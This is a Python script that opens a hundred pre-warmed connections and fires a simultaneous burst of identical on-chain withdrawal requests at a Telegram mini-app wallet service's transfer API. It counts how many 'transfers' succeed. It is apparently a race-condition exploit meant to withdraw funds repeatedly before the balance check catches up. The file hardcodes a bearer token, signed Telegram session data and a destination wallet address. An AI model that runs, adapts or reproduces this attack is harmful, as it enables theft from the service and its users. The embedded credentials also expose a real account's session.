import asyncio
import os
import time
import aiohttp
import orjson
from collections import Counter

try:
    import uvloop
    uvloop.install()
except ImportError:
    pass

# Endpoint extracted from your curl requests
URL = "https://walletfather.up.railway.app/api/wallet/transfer/onchain"

HEADERS = {
    "accept": "application/json, text/plain, */*",
    "accept-language": "uz-UZ,uz;q=0.9,en-GB;q=0.8,en;q=0.7,ko-KR;q=0.6,ko;q=0.5,en-US;q=0.4",
    "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Ijg0MDAwMTQ2NjQiLCJpYXQiOjE3ODY1Mzk0OTMsImV4cCI6MTc4NzE0NDI5M30.1XukXDDyYdkJh0U_NxYdb0rr4lmgLO5i37WIXdjQGDE",
    "cache-control": "no-cache",
    "content-type": "application/json",
    "origin": "https://walletfather.pages.dev",
    "pragma": "no-cache",
    "priority": "u=1, i",
    "referer": "https://walletfather.pages.dev/",
    "sec-ch-ua": '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Linux"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36",
    "x-telegram-initdata": "user=%7B%22id%22%3A8400014664%2C%22first_name%22%3A%22.%22%2C%22last_name%22%3A%22%22%2C%22username%22%3A%22ompcertificatetaker1%22%2C%22language_code%22%3A%22en%22%2C%22allows_write_to_pm%22%3Atrue%2C%22photo_url%22%3A%22https%3A%5C%2F%5C%2Ft.me%5C%2Fi%5C%2Fuserpic%5C%2F320%5C%2FaTGFdIRaFf2wTKZFFcxsiWM3gw3iPouQXFWziNqUfgetvnMyyRQIJTxajAcCN4Yt.svg%22%7D&chat_instance=5249356051442232645&chat_type=sender&auth_date=1786539486&signature=AR7G76cKz8C5MGxz-b25XKPQHFFzsa2UaffYlZ__fK4OAF7WSU2STr2AT5a-DFkCHNcFnkG5S1J1Xlw7hHuBDQ&hash=b7b2f881e1415454e3c34fe9fe95f6204f4f672c48e2937819da98a9537bf206"
}

# Transfer parameters extracted from your payload
DEFAULT_TRANSFER_PAYLOAD = {
    "address": "UQAwOVma_bRUcjF9cQozhhOHAGfJ-Yno5_g38N_Vq_v1Ga-h",
    "amount": 0.1,
    "asset": "GRAM",
    "memo": ""
}

success_count = 0
fail_count = 0
error_reasons = Counter()
REQUEST_TIMEOUT = aiohttp.ClientTimeout(total=10.0)
results = []


async def send_single_request(session, payload_bytes, idx):
    try:
        async with session.post(URL, data=payload_bytes, timeout=REQUEST_TIMEOUT, ssl=False) as resp:
            results[idx] = (resp.status, await resp.read())
            text2 = await resp.text()
            print(text2)
    except Exception as e:
        results[idx] = (0, e)


async def main():
    global success_count, fail_count, results

    # Control total concurrent executions via environment variable or default
    burst_count = int(os.getenv("BURST_COUNT", "100"))
    total = burst_count
    results = [None] * total

    connector = aiohttp.TCPConnector(
        limit=0,
        limit_per_host=0,
        force_close=False,
        enable_cleanup_closed=False,
        ttl_dns_cache=3600,
        use_dns_cache=True,
        keepalive_timeout=60,
        ssl=False
    )

    async with aiohttp.ClientSession(connector=connector, headers=HEADERS) as session:
        async def _warm_one():
            try:
                async with session.options(URL, ssl=False, timeout=aiohttp.ClientTimeout(total=2.0)) as r:
                    await r.read()
            except Exception:
                pass

        print(f"🔥 Pre-warming {total} TLS sockets in connection pool...")
        warm_tasks = [_warm_one() for _ in range(total)]
        await asyncio.gather(*warm_tasks)

        payload_bytes = orjson.dumps(DEFAULT_TRANSFER_PAYLOAD)

        tasks = [
            asyncio.create_task(send_single_request(session, payload_bytes, idx))
            for idx in range(total)
        ]

        print(f"⚡ MASS BURST: DISPATCHING {total} ON-CHAIN TRANSFER REQUESTS AT ONCE…")
        start_time = time.time()
        await asyncio.gather(*tasks)
        duration = time.time() - start_time

    # Process metrics and responses
    for res in results:
        if not res:
            fail_count += 1
            error_reasons["No Response"] += 1
            continue

        status, raw_resp = res
        if isinstance(raw_resp, Exception):
            fail_count += 1
            error_reasons[type(raw_resp).__name__] += 1
            continue

        if status in (200, 201):
            success_count += 1
        else:
            try:
                data = orjson.loads(raw_resp)
                msg = data.get("message") or data.get("error") or f"HTTP {status}"
            except Exception:
                msg = f"HTTP {status}"
            error_reasons[msg] += 1
            fail_count += 1

    rps = total / duration if duration > 0 else 0
    avg_lat = (duration / total) * 1000 if total > 0 else 0

    print(f"\n==================================================")
    print(f"🎉 ALL {total} REQUESTS PROCESSED IN {duration:.3f} SECONDS!")
    print(f"🚀 THROUGHPUT              : {rps:.1f} REQ/SEC")
    print(f"⚡ AVG LATENCY PER REQ     : {avg_lat:.2f} ms")
    print(f"✅ SUCCESSFUL TRANSFERS    : {success_count} / {total}")
    print(f"❌ FAILED / DROPPED       : {fail_count} / {total}")
    if error_reasons:
        print("\n📊 ERROR BREAKDOWN:")
        for err, count in error_reasons.most_common():
            print(f"  • {err}: {count}")
    print(f"==================================================")


if __name__ == "__main__":
    asyncio.run(main())